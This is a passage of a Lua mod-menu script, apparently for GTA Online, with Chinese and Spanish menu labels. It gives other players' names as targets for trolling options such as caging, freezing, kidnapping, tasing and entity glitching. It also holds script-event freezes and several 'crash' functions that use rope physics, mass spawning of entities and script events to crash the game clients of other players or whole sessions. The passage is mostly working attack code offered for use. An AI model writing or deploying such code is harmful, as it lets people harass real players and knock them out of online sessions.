            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_anim_bm_water_mist", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false
            )
            menu.set_value(freeze_toggle, false)
        end
    end)
    
    menu.toggle_loop(lagplay, "V5", {"rlag5"}, "", function()
        if players.exists(player_id) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(player_id), "Trolling>Freeze")
            local player_pos = players.get_position(player_id)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)
	
    local cageveh = menu.list(trolling, "笼子选项", {}, "")

    menu.action(cageveh, "载具笼子", {"cage"}, "", function()
        local container_hash = util.joaat("benson")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.SET_ENTITY_VISIBLE(container, false)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)

    local cage = menu.list(trolling, "困住玩家", {}, "")
    menu.action(cage, "电笼子", {"electriccage"}, "", function(cl)
        local number_of_cages = 6
        local elec_box = util.joaat("prop_elecbox_12")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.5)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
                obj_pos.z += 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)
    
    menu.action(cage, "英国女王笼子", {""}, "", function(cl)
        local number_of_cages = 6
        local coffin_hash = util.joaat("prop_coffin_02b")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(coffin_hash)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.8)
            obj_pos:add(pos)
            obj_pos.z += 0.1
           local coffin = entities.create_object(coffin_hash, obj_pos)
           spawned_objects[#spawned_objects + 1] = coffin
           ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
           ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
        end
    end)

    menu.action(cage, "货箱笼子", {"cage"}, "", function()
        local container_hash = util.joaat("prop_container_ld_pu")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        pos.z -= 1
        local container = entities.create_object(container_hash, pos, 0)
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)


    menu.action(cage, "删除笼子", {"clearcages"}, "", function()
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount += 1
        end
        util.toast("Deleted " .. entitycount .. " cages")
    end)

    menu.action(trolling, "隐形笼子", {""}, "", function(cl)
        local number_of_cages = 10
        local ladder_hash = util.joaat("prop_towercrane_02el2")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z -= 0.5
        request_model(ladder_hash)
        
        if TASK.IS_PED_STILL(ped) then
            util.toast("The player is still.")
        return end

        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.25)
            obj_pos:add(pos)
            local ladder = entities.create_object(ladder_hash, obj_pos)
            ladder_objects[#ladder_objects + 1] = ladder
            ENTITY.SET_ENTITY_VISIBLE(ladder, false)
            ENTITY.SET_ENTITY_ROTATION(ladder, 0.0, 0.0, angle, 2, 0)
            ENTITY.FREEZE_ENTITY_POSITION(ladder, true)
        end
        util.yield(2500)
        for i, object in ipairs(ladder_objects) do
            entities.delete_by_handle(object)
        end
    end)




    menu.divider(trolling, "其他选项")

    menu.action(trolling, "生成坡道在他面前", {}, "", function() 
        local ramp_hash = util.joaat("stt_prop_ramp_jump_s")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0, 10, -2)
        local rot = ENTITY.GET_ENTITY_ROTATION(ped, 2)
        STREAMING.REQUEST_MODEL(ramp_hash)
    	while not STREAMING.HAS_MODEL_LOADED(ramp_hash) do
    		util.yield()
    	end

        local ramp = OBJECT.CREATE_OBJECT(ramp_hash, pos.x, pos.y, pos.z, true, false, true)

        ENTITY.SET_ENTITY_VISIBLE(ramp, false)
        ENTITY.SET_ENTITY_ROTATION(ramp, rot.x, rot.y, rot.z + 90, 0, true)
        util.yield(1000)
        entities.delete_by_handle(ramp)
    end)

    menu.action(trolling,"拐走玩家", {}, "", function()
        veh_to_attach = 1
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)

		if table_kidnap == nil then
			table_kidnap = {}
		end

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

            util.yield(500)

            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)


        end
	end)

   


    local freeze = menu.list(malicious, "冻结选项", {}, "")


    menu.toggle_loop(freeze, "模型冻结", {""}, "", function(on_click)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    end)
    player_toggle_loop(freeze, player_id, "脚本冻结V1", {}, "", function()
        util.trigger_script_event(1 << player_id , {330622597, player_id, 0, 0, 0, 0, 0})
    end)

    player_toggle_loop(freeze, player_id, "脚本冻结V2", {}, "", function()
        util.trigger_script_event(1 << player_id, {-1796714618, player_id, 0, 1, 0, 0})
        util.yield(500)
    end)
   player_toggle_loop(freeze, player_id, "脚本冻结V3", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        util.trigger_script_event(1 << player_id, {-93722397, player_id, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {330622597, player_id, 0, 0, 0, 0, 0})
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(player_id)
        util.yield(500)
    end)

	menu.action(trolling, "派遣劫匪", {}, "", function()
		sendmugger_npc(player_id)
	end)
    menu.toggle_loop(trolling, "电击玩家", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = players.get_position(player_id)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), false, false, true, 1.0)
    end)

    menu.action(trolling, "杀死室内玩家", {}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
    
        for i, interior in ipairs(interior_stuff) do
            if ryze.is_player_in_interior(player_id) == interior then
            return end
            if ryze.is_player_in_interior(player_id) ~= interior then
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
            end
        end
    end)

    glitchiar = menu.list(trolling, "实体恶搞选项", {}, "")


    player_toggle_loop(glitchiar, player_id, "隐形实体恶搞", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        local glitch_hash = util.joaat("prop_shuttering03")
        request_model(glitch_hash)
        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 1, 0))
        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 0, 0))
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)
        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)
        util.yield()
        entities.delete_by_handle(dumb_object_front)
        entities.delete_by_handle(dumb_object_back)
        util.yield()    
    end)


    local glitch_player_list = menu.list(glitchiar, "选择实体恶搞", {"glitchdelay"}, "") 
    local object_stuff = {
        names = {
            "摩天轮",
            "UFO",
            "水泥搅拌机",
            "脚手架",
            "车库门",
            "大保龄球",
            "大足球",
            "橙色的球",
            "坡道",

        },
        objects = {
            "prop_ld_ferris_wheel",
            "p_spinning_anus_s",
            "prop_staticmixer_01",
            "prop_towercrane_02a",
            "des_scaffolding_root",
            "prop_sm1_11_garaged",
            "stt_prop_stunt_bowling_ball",
            "stt_prop_stunt_soccer_ball",
            "prop_juicestand",
            "stt_prop_stunt_jump_l",
        }
    }

    local object_hash = util.joaat("prop_ld_ferris_wheel")
    menu.list_select(glitch_player_list, "实体", {"glitchplayer"}, "", object_stuff.names, 1, function(index)
        object_hash = util.joaat(object_stuff.objects[index])
    end)

    menu.slider(glitch_player_list, "生成延迟", {"spawndelay"}, "", 0, 3000, 50, 10, function(amount)
        delay = amount
    end)

    local glitchPlayer = false
    local glitchPlayer_toggle
    glitchPlayer_toggle = menu.toggle(glitch_player_list, "发送实体", {}, "", function(toggled)
        glitchPlayer = toggled

        while glitchPlayer do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
				util.toast("Player is too far. :/")
				menu.set_value(glitchPlayer_toggle, false)
            break end

            if not players.exists(player_id) then 
                util.toast("Player doesn't exist. :/")
                menu.set_value(glitchPlayer_toggle, false)
            util.stop_thread() end

            local glitch_hash = object_hash
            local poopy_butt = util.joaat("rallytruck")
            request_model(glitch_hash)
            request_model(poopy_butt)
            local stupid_object = entities.create_object(glitch_hash, pos)
            local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            util.yield(delay)
            entities.delete_by_handle(stupid_object)
            entities.delete_by_handle(glitch_vehicle)
            util.yield(delay)    
        end
    end)

    local glitchVeh = false
    local glitchVehCmd
    glitchVehCmd = menu.toggle(glitchiar, "载具故障", {"glitchvehicle"}, "", function(toggle) 
        glitchVeh = toggle
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(player_id)
        local ped_hash = util.joaat("a_m_m_acult_01")
        local object_hash = util.joaat("prop_ld_ferris_wheel")
        request_model(ped_hash)
        request_model(object_hash)
        
        while glitchVeh do
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(player_id)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                util.toast("Player muh away. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not players.exists(player_id) then 
                util.toast("The player does not exist. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not PED.IS_PED_IN_VEHICLE(ped, player_veh, false) then 
                util.toast("The player is not in a car. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                util.toast("There are no seats available. :c")
                menu.set_value(glitchVehCmd, false);
            break end

            local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
            local glitch_obj = entities.create_object(object_hash, pos)
            local glitched_ped = entities.create_ped(26, ped_hash, pos, 0)
            local things = {glitched_ped, glitch_obj}

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)

            ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)

            for i, spawned_objects in ipairs(things) do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
                ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
                ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
            end

            for i = 0, seat_count -1 do
                if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                    local emptyseat = i
                    for l = 1, 25 do
                        PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                        ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                        util.yield()
                    end
                end
            end
            if not menu.get_value(glitchVehCmd) then
                entities.delete_by_handle(glitched_ped)
                entities.delete_by_handle(glitch_obj)
            end
            if glitched_ped ~= nil then
                entities.delete_by_handle(glitched_ped) 
            end
            if glitch_obj ~= nil then 
                entities.delete_by_handle(glitch_obj)
            end
        end
    end)

    menu.action_slider(glitchiar, "发射玩家车辆", {}, "", launch_vehicle, function(index, value)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            util.toast("No esta en un vehiculo. D:")
            return
        end

        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
            util.yield()
        end

        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
            util.toast("You cannot control the vehicle. D:")
            return
        end

        pluto_switch value do
            case "Lanzar Arriba":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Adelante":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Atras":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, -100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Lanzar Abajo":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, -100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            case "Catapulta":
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0.0, 100000.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 100000.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                break
            end
        end)





    crashes = menu.list(malicious, "崩溃选项", {}, "", function(); end)

    local begcrash = {
		"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Hey bro, it would be pretty poggers to close your game for me",
		"pwease cwash yowour game fowor me",
		"Close your game. I'm not asking.",
		"Please close your game, please please please please please",
    	"Please close your game, please please please please please",
	}


    menu.action(crashes, "主机崩溃", {""}, "", function()
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        menu.trigger_commands("tpmazehelipad")
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(1000)
        menu.trigger_commands("tpmazehelipad")
    end)

	menu.action(crashes, "Frame崩溃", {}, "被大部分菜单拦截", function()
		menu.trigger_commands("smstext" .. PLAYER.GET_PLAYER_NAME(player_id).. " " .. begcrash[math.random(1, #begcrash)])
		util.yield()
		menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(player_id))
	end)

    menu.action(crashes, "Model崩溃 V1", {"crashv1"}, "", function()
        local mdl = util.joaat('a_c_poodle')
        BlockSyncs(player_id, function()
            if request_model(mdl, 2) then
                local pos = players.get_position(player_id)
                util.yield(100)
                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 3, 0), 0) 
                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                local obj
                repeat
                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                until obj ~= 0 or util.yield()
                ENTITY.DETACH_ENTITY(obj, true, true) 
                util.yield(1500)
                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                entities.delete_by_handle(ped1)
                util.yield(1000)
            else
            end
        end)
    end)
   

    menu.click_slider(crashes, "大自然崩溃" , {""}, "",1, 2, 1, 1, function(on_change)
        if on_change == 1 then
        local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
            util.yield(100)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            util.yield()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            util.yield(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            util.yield(1000)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
        end
   
    if on_change == 2 then
        local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
            util.yield(100)
            menu.trigger_commands("invisibility on")
            for i = 0, 110 do
                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
                PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
                util.yield(50)
                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            end
            util.yield(250)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            menu.trigger_commands("invisibility off")
        end
    end)
 

    menu.action(crashes, "崩溃 Sesion V1", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local hashes = {2132890591, 2727244247}
        local pc = players.get_position(player_id)
        local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
        local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
        local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
        util.yield(1000)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
        PHYSICS.DELETE_CHILD_ROPE(rope)
        PHYSICS.ROPE_UNLOAD_TEXTURES()
    end)

    menu.action(crashes, "崩溃Sesion V2", {}, "", function(on_loop)
        PHYSICS.ROPE_LOAD_TEXTURES()
        local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        pos.x = pos.x+5
        ppos.z = ppos.z+1
        cargobob = entities.create_vehicle(2132890591, pos, 0)
        cargobob_pos = ENTITY.GET_ENTITY_COORDS(cargobob)
        kur = entities.create_ped(26, 2727244247, ppos, 0)
        kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, kur, cargobob_pos.x, cargobob_pos.y, cargobob_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center")
    end)

    
    menu.action(crashes, "崩溃 Sesion V3", {}, "", function()
        for i = 1, 10 do
            util.trigger_script_event(1 << player_id, {243072129, player_id, 1, player_id, 0, 1, 0})  
        end
    end)

    menu.action(crashes, "崩溃 Sesion V4", {"crashv27"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local pos = players.get_position(player_id)
        local mdl = util.joaat("A_C_Cat_01")
        local mdl2 = util.joaat("U_M_Y_Zombie_01")
        local mdl3 = util.joaat("A_F_M_ProlHost_01")
        local mdl4 = util.joaat("A_M_M_SouCent_01")
        local veh_mdl = util.joaat("insurgent2")
        local veh_mdl2 = util.joaat("brawler")
        util.request_model(veh_mdl)
        util.request_model(veh_mdl2)
        util.request_model(mdl)
        util.request_model(mdl2)
        util.request_model(mdl3)
        util.request_model(mdl4)
        for i = 1, 250 do
            local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
            local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
            local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
            local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
            local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)

            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)

            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)

            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
            util.yield(100)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)

            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
            
